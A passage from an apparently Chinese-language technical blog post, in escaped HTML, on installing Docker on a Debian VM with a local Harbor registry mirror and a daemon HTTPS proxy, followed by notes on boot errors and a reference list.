class=\"line\">/dev/sda15      124M   12M  113M  10% /boot/efi</span><br><span class=\"line\">tmpfs            97M     0   97M   0% /run/user/1000</span><br><span class=\"line\">tmpfs            97M     0   97M   0% /run/user/0</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、安装-Docker\"><a href=\"#三、安装-Docker\" class=\"headerlink\" title=\"三、安装 Docker\"></a>三、安装 Docker</h2><h3 id=\"1-获得-docker-源公钥\"><a href=\"#1-获得-docker-源公钥\" class=\"headerlink\" title=\"1. 获得 docker 源公钥\"></a>1. 获得 docker 源公钥</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get update</span><br><span class=\"line\">apt-get install ca-certificates curl</span><br><span class=\"line\">install -m 0755 -d /etc/apt/keyrings</span><br><span class=\"line\">curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> a+r /etc/apt/keyrings/docker.asc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /etc/apt/keyrings/docker.asc</span><br></pre></td></tr></table></figure>\n\n<p>如果 curl 成功的话，此时应该显示 docker 源公钥的信息.</p>\n<h3 id=\"2-安装-docker-源\"><a href=\"#2-安装-docker-源\" class=\"headerlink\" title=\"2. 安装 docker 源\"></a>2. 安装 docker 源</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> \\</span><br><span class=\"line\">  <span class=\"string\">&quot;deb [arch=<span class=\"subst\">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \\</span></span><br><span class=\"line\"><span class=\"string\">  <span class=\"subst\">$(. /etc/os-release &amp;&amp; echo <span class=\"string\">&quot;<span class=\"variable\">$VERSION_CODENAME</span>&quot;</span>)</span> stable&quot;</span> | \\</span><br><span class=\"line\">  sudo <span class=\"built_in\">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class=\"line\">apt-get update</span><br></pre></td></tr></table></figure>\n\n<p>此时应该可以看到 docker 源信息。</p>\n<blockquote>\n<p>docker 源的配置文件仍然是传统的单行模式，不是新的 Deb 822 格式。</p>\n</blockquote>\n<h3 id=\"3-安装docker\"><a href=\"#3-安装docker\" class=\"headerlink\" title=\"3. 安装docker\"></a>3. 安装docker</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Install the Docker packages</span></span><br><span class=\"line\">apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br><span class=\"line\">apt-get install docker-compose</span><br><span class=\"line\"></span><br><span class=\"line\">docker info</span><br></pre></td></tr></table></figure>\n\n<p>此时应该看到 docker 启动的配置信息，当前版本是 28.0</p>\n<h3 id=\"4a-设置本地镜像源\"><a href=\"#4a-设置本地镜像源\" class=\"headerlink\" title=\"4a. 设置本地镜像源\"></a>4a. 设置本地镜像源</h3><p>编辑 <code>/etc/docker/daemon.json</code></p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;insecure-registries&quot;:</span> [<span class=\"string\">&quot;harbor.lan&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">&quot;registry-mirrors&quot;:</span> [<span class=\"string\">&quot;https://harbor.lan&quot;</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>重启 Docker 让配置生效</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl restart docker</span><br><span class=\"line\"></span><br><span class=\"line\">docker run harbor.lan/proxy/library/hello-world</span><br></pre></td></tr></table></figure>\n\n<p>如果拉取镜像成功的话，此时应该看到 hello-world 的运行信息</p>\n<h3 id=\"4b-为-docker-提供-ssl-proxy\"><a href=\"#4b-为-docker-提供-ssl-proxy\" class=\"headerlink\" title=\"4b. 为 docker 提供 ssl proxy\"></a>4b. 为 docker 提供 ssl proxy</h3><p>新建 docker systemd 启动服务目录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure>\n\n<p>编辑 proxy 配置文件<code>/etc/systemd/system/docker.service.d/http-proxy.conf</code></p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\">[<span class=\"string\">Service</span>]</span><br><span class=\"line\"><span class=\"string\">Environment=&quot;HTTPS_PROXY=http://192.168.73.5:1082&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>重启 Docker 让配置生效</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl restart docker</span><br><span class=\"line\"></span><br><span class=\"line\">docker run hello-world</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、简要分析\"><a href=\"#四、简要分析\" class=\"headerlink\" title=\"四、简要分析\"></a>四、简要分析</h2><h3 id=\"1-安装-generic-版本启动时，提示错误提示无法加载regulatory-db\"><a href=\"#1-安装-generic-版本启动时，提示错误提示无法加载regulatory-db\" class=\"headerlink\" title=\"1. 安装 generic 版本启动时，提示错误提示无法加载regulatory.db\"></a>1. 安装 generic 版本启动时，提示错误提示无法加载<code>regulatory.db</code></h3><p>原因分析：linux 内核加载 <code>cfg80211</code> 模块以支持无线网卡，但漏安装了系统软件。<br>解决办法： <code>apt install iw</code></p>\n<p>不过，现在是更加精简的 generic-cloud 版本，没有无线网卡模块也就没有这个错误了。</p>\n<h3 id=\"2-系统启动时-linux-内核崩溃\"><a href=\"#2-系统启动时-linux-内核崩溃\" class=\"headerlink\" title=\"2. 系统启动时 linux 内核崩溃\"></a>2. 系统启动时 linux 内核崩溃</h3><p>这个版本还曾经出现系统崩溃，提示 kernel panic - not syncing: killing interrupt handler!<br>出现场景是 HD 扩容后重启时，但是再次重启就能正常处理！！！</p>\n<h3 id=\"3-系统启动有-PCI-告警\"><a href=\"#3-系统启动有-PCI-告警\" class=\"headerlink\" title=\"3. 系统启动有 PCI 告警\"></a>3. 系统启动有 PCI 告警</h3><p>提示信息：acpi PNP0A03:00: fail to add MMCONFIG information, can’t access extended PCI configuration space under this bridge.<br>目前系统运行无影响，原因待查。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://tech.he-sb.top/posts/creating-vm-template-for-pve-based-on-cloud-init/\">PVE 制作基于 Cloud Init 的虚拟机模板</a></li>\n<li><a href=\"https://www.voidking.com/dev-ubuntu-change-software-repo/\">Ubuntu&#x2F;Debian更换软件安装源</a></li>\n<li><a href=\"https://neucrack.com/p/286\">docker 设置代理，以及国内加速镜像设置</a></li>\n<li><a href=\"https://forum.proxmox.com/threads/cfg80211-failed-to-load-regulatory-db.137298/\">cfg80211：无法加载regulatory.db</a></li>\n<li><a href=\"https://cn.linux-terminal.com/?p=4467#google_vignette\">为 Proxmox 虚拟机启用 SPICE 支持</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/2423782\">不同场景下 Docker 的网络代理方法</a></li>\n</ul>\n<h2 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h2><ul>\n<li><a href=\"https://manpages.debian.org/stretch/apt/sources.list.5.en.html\">SOURCES.LIST - Debian</a></li>\n<li><a href=\"https://docs.docker.com/engine/install/debian/\">Debian 系统如何安装 Docker - Docker 官方</a></li>\n</ul>\n"}]